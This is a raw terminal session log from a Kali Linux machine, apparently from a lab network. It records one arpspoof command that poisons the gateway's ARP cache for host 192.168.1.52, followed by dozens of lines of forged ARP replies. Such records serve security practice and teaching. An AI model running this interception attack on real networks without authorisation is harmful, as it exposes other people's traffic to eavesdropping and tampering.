Script started on 2025-06-15 17:05:11+03:00 [TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="98" LINES="14"]
                                                                                                  ]0;cybella@kali: ~[0m[27m[24m[J[32m┌──([1m[32m[34mcybella㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hsudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.52
[K[A[4C[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [36ma[36mr[36mp[36ms[36mp[36mo[36mo[36mf[39m [32m-[32mi[39m[6C[32m-[32mt[39m[1B[K[?1l>[?2004l
[sudo] password for cybella: 
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
8:0:27:3a:23:8d 6c:e8:73:52:30:98 0806 42: arp reply 192.168.1.52 is-at 8:0:27:3a:23:8d
